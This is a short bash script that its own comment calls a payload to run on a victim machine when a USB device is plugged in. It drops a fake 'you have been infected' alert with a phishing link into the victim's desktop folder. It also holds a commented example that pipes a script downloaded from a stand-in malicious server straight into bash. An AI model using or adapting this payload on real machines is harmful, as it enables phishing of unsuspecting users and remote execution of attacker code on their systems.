#!/bin/bash

# Payload script that runs on a victim machine when USB is plugged in
echo "You have been infected! Please click this link to resolve the issue: http://fake-login-page.com" > /home/victim/desktop/fake_alert.txt

# Additional malicious commands can be added here
# For example, downloading a payload from a remote server:
# curl http://malicious-server.com/payload.sh | bash
